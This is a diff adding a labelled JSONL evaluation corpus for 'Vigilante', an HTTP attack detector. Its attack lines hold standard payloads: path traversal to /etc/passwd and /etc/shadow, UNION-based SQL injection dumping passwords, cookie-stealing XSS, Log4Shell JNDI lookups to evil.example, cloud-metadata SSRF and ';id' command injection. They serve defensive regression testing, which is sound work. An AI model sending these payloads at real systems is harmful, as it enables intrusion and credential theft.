@@ -1,0 +1,71 @@
+# Vigilante detector eval corpus (JSONL).
+#
+# One labelled request per line. The built-in detector runs on the same
+# enriched envelope a live flow produces, and `vigilante -mode eval` reports
+# recall, precision, and false-positive rate by category.
+#
+#   vigilante -mode eval -eval-corpus deploy/eval/corpus.jsonl
+#
+# Fields: id, class (attack|benign), category, method, path, query, body,
+# headers, note. Rotate the UA/query values instead of adding near-duplicates:
+# the corpus is a regression gate, not a fuzzer.
+{"id":"pt-01","class":"attack","category":"path-traversal","method":"GET","path":"/download","query":"file=../../../../etc/passwd","note":"classic traversal in a file parameter"}
+{"id":"pt-02","class":"attack","category":"path-traversal","method":"GET","path":"/static/..%2f..%2f..%2fetc%2fshadow","note":"encoded traversal in the path"}
+{"id":"pt-03","class":"attack","category":"path-traversal","method":"GET","path":"/files/%252e%252e%252f%252e%252e%252fetc%252fpasswd","note":"double-encoded traversal"}
+{"id":"pt-04","class":"attack","category":"path-traversal","method":"POST","path":"/upload","body":"filename=..\\..\\windows\\win.ini","note":"Windows-style traversal in a multipart name"}
+{"id":"pt-05","class":"attack","category":"path-traversal","method":"GET","path":"/read","query":"path=/proc/self/environ","note":"procfs disclosure attempt"}
+{"id":"sq-01","class":"attack","category":"sqli","method":"GET","path":"/item","query":"id=1' UNION SELECT username,password FROM users--","note":"union-based injection"}
+{"id":"sq-02","class":"attack","category":"sqli","method":"GET","path":"/products","query":"category=1 OR 1=1--","note":"tautology"}
+{"id":"sq-03","class":"attack","category":"sqli","method":"POST","path":"/login","body":"username=admin' or '1'='1&password=x","note":"auth bypass in a form body"}
+{"id":"sq-04","class":"attack","category":"sqli","method":"GET","path":"/search","query":"q=1;SELECT+SLEEP(5)","note":"time-based blind injection"}
+{"id":"sq-05","class":"attack","category":"sqli","method":"GET","path":"/report","query":"table=users UNION ALL SELECT * FROM information_schema.tables","note":"schema enumeration"}
+{"id":"xs-01","class":"attack","category":"xss","method":"GET","path":"/search","query":"q=<script>alert(1)</script>","note":"reflected script tag"}
+{"id":"xs-02","class":"attack","category":"xss","method":"GET","path":"/profile","query":"name=javascript:alert(document.cookie)","note":"javascript: URI"}
+{"id":"xs-03","class":"attack","category":"xss","method":"POST","path":"/comment","body":"<img src=x onerror=alert(1)>","note":"event handler in a body"}
+{"id":"xs-04","class":"attack","category":"xss","method":"GET","path":"/page","query":"next=\"><svg/onload=alert(1)>","note":"attribute break-out"}
+{"id":"lg-01","class":"attack","category":"log4shell","method":"GET","path":"/","headers":{"User-Agent":"${jndi:ldap://evil.example/a}"},"note":"JNDI lookup in a user agent"}
+{"id":"lg-02","class":"attack","category":"log4shell","method":"GET","path":"/api","query":"x=${lower:jndi:ldap://evil.example/x}","note":"lower-case indirection"}
+{"id":"lg-03","class":"attack","category":"log4shell","method":"POST","path":"/login","body":"username=${env:JNDI:rmi://evil.example/a}","note":"env indirection in a form body"}
+{"id":"ss-01","class":"attack","category":"ssrf","method":"GET","path":"/fetch","query":"url=http://169.254.169.254/latest/meta-data/","note":"cloud metadata endpoint"}
+{"id":"ss-02","class":"attack","category":"ssrf","method":"POST","path":"/webhook","body":"{\"url\":\"http://metadata.google.internal/computeMetadata/v1/\"}","note":"GCP metadata host"}
+{"id":"ss-03","class":"attack","category":"ssrf","method":"GET","path":"/proxy","query":"target=gopher://127.0.0.1:6379/_INFO","note":"gopher to an internal service"}
+{"id":"sc-01","class":"attack","category":"scanner","method":"GET","path":"/","headers":{"User-Agent":"sqlmap/1.7.2#stable"},"note":"sqlmap"}
+{"id":"sc-02","class":"attack","category":"scanner","method":"GET","path":"/login","headers":{"User-Agent":"Nikto/2.1.6"},"note":"nikto"}
+{"id":"sc-03","class":"attack","category":"scanner","method":"GET","path":"/","headers":{"User-Agent":"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"},"note":"nmap NSE"}
+{"id":"sc-04","class":"attack","category":"scanner","method":"GET","path":"/admin","headers":{"User-Agent":"gobuster/3.6"},"note":"content discovery"}
+{"id":"sf-01","class":"attack","category":"sensitive-file","method":"GET","path":"/.git/config","note":"repository metadata"}
+{"id":"sf-02","class":"attack","category":"sensitive-file","method":"GET","path":"/.env","note":"environment file"}
+{"id":"sf-03","class":"attack","category":"sensitive-file","method":"GET","path":"/actuator/env","note":"Spring actuator env"}
+{"id":"sf-04","class":"attack","category":"sensitive-file","method":"GET","path":"/wp-config.php","note":"WordPress config"}
+{"id":"b-01","class":"benign","category":"benign","method":"GET","path":"/api/v1/users","note":"list endpoint"}
+{"id":"b-02","class":"benign","category":"benign","method":"GET","path":"/healthz","note":"liveness probe"}
+{"id":"b-03","class":"benign","category":"benign","method":"GET","path":"/ready","note":"readiness probe"}
+{"id":"b-04","class":"benign","category":"benign","method":"GET","path":"/api/v1/users/42","note":"single resource"}
+{"id":"b-05","class":"benign","category":"benign","method":"POST","path":"/api/v1/auth/login","body":"{\"username\":\"alice\",\"password\":\"correct horse battery staple\"}","note":"normal login"}
+{"id":"b-06","class":"benign","category":"benign","method":"GET","path":"/api/v1/search","query":"q=how+to+select+a+union+representative","note":"prose that contains union/select as words"}
+{"id":"b-07","class":"benign","category":"benign","method":"GET","path":"/assets/app.4f2c.js","note":"hashed bundle"}
+{"id":"b-08","class":"benign","category":"benign","method":"GET","path":"/assets/logo.svg","note":"image"}
+{"id":"b-09","class":"benign","category":"benign","method":"GET","path":"/favicon.ico","note":"browser default"}
+{"id":"b-10","class":"benign","category":"benign","method":"GET","path":"/api/v1/orders","query":"page=2&limit=50","note":"pagination"}
+{"id":"b-11","class":"benign","category":"benign","method":"POST","path":"/api/v1/orders","body":"{\"sku\":\"ABC-123\",\"qty\":2}","note":"create order"}
+{"id":"b-12","class":"benign","category":"benign","method":"PUT","path":"/api/v1/users/42","body":"{\"name\":\"Alice\"}","note":"update profile"}
+{"id":"b-13","class":"benign","category":"benign","method":"DELETE","path":"/api/v1/sessions/abc","note":"logout"}
+{"id":"b-14","class":"benign","category":"benign","method":"GET","path":"/api/v1/items","query":"sort=created_at&order=desc","note":"ordering term"}
+{"id":"b-15","class":"benign","category":"benign","method":"GET","path":"/graphql","query":"query={user(id:1){name}}","note":"graphql GET"}
+{"id":"b-16","class":"benign","category":"benign","method":"POST","path":"/graphql","body":"{\"query\":\"{users{id name}}\"}","note":"graphql POST"}
+{"id":"b-17","class":"benign","category":"benign","method":"GET","path":"/api/v1/files/report-2024.pdf","note":"document download"}
+{"id":"b-18","class":"benign","category":"benign","method":"GET","path":"/admin/dashboard","headers":{"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"},"note":"admin UI for a logged-in operator"}
+{"id":"b-19","class":"benign","category":"benign","method":"GET","path":"/api/v1/notifications","note":"notifications"}
+{"id":"b-20","class":"benign","category":"benign","method":"GET","path":"/","query":"utm_source=newsletter&utm_medium=email","note":"campaign tracking"}
+{"id":"b-21","class":"benign","category":"benign","method":"POST","path":"/api/v1/webhooks","body":"{\"url\":\"https://hooks.example.com/ok\"}","note":"webhook registration"}
+{"id":"b-22","class":"benign","category":"benign","method":"GET","path":"/api/v1/users","query":"filter=active&sort=name","note":"filtering"}
+{"id":"b-23","class":"benign","category":"benign","method":"GET","path":"/docs","note":"documentation"}
+{"id":"b-24","class":"benign","category":"benign","method":"GET","path":"/api/v1/metrics","note":"metrics scrape"}
+{"id":"b-25","class":"benign","category":"benign","method":"POST","path":"/api/v1/upload","body":"filename=report.pdf","note":"ordinary upload"}
+{"id":"b-26","class":"benign","category":"benign","method":"GET","path":"/api/v1/search","query":"q=cheap+flights+to+london","note":"plain search"}
+{"id":"b-27","class":"benign","category":"benign","method":"GET","path":"/api/v1/search","query":"q=how+to+drop+table+in+excel","note":"prose about dropping a table"}
+{"id":"b-28","class":"benign","category":"benign","method":"GET","path":"/login","headers":{"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},"note":"login page"}
+{"id":"b-29","class":"benign","category":"benign","method":"GET","path":"/integrations/nmap-connector","note":"a scanner name in a path is not a scanner"}
+{"id":"sq-06","class":"attack","category":"sqli","method":"GET","path":"/item","query":"id=1 AND SLEEP 5","note":"known miss: time-based probe without parentheses"}
+{"id":"or-01","class":"attack","category":"open-redirect","method":"GET","path":"/login","query":"next=//evil.example/phish","note":"known miss: open redirect needs an allowlist, not a marker"}
+{"id":"cm-01","class":"attack","category":"command-injection","method":"GET","path":"/ping","query":"host=127.0.0.1;id","note":"known miss: shell metacharacters are too common to match literally"}
